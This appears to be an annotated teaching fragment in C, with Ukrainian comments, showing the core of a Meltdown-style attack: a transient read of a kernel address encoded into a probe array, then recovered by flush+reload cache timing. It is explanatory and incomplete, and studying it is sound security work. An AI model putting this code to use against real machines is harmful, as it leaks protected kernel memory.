/* Приймальний масив: 256 сторінок по 4096 байтів — по одній на кожне
   можливе значення байта. Розмір сторінки взято навмисно: сусідні
   значення потрапляють у геть різні рядки кешу, і апаратне
   випереджувальне читання не притягне сусіда «за компанію». */
static uint8_t probe[256 * 4096];

/* … перед пострілом усі 256 рядків витиснуто з кешу clflush-ом … */

/* Передавач: два рядки, обидва будуть скасовані. */
value = *(volatile uint8_t *)kernel_addr;  /* заборонено; вирок буде пізніше */
tmp   = probe[value * 4096];               /* устигає торкнутися одного рядка */

/* Приймач: після скасування шукаємо, який рядок став теплим. */
unsigned aux;
for (int i = 0; i < 256; i++) {
    volatile uint8_t *p = &probe[i * 4096];
    uint64_t t0 = __rdtscp(&aux);
    (void)*p;
    uint64_t dt = __rdtscp(&aux) - t0;
    if (dt < THRESHOLD)
        secret = i;                        /* цей рядок уже був у кеші */
}
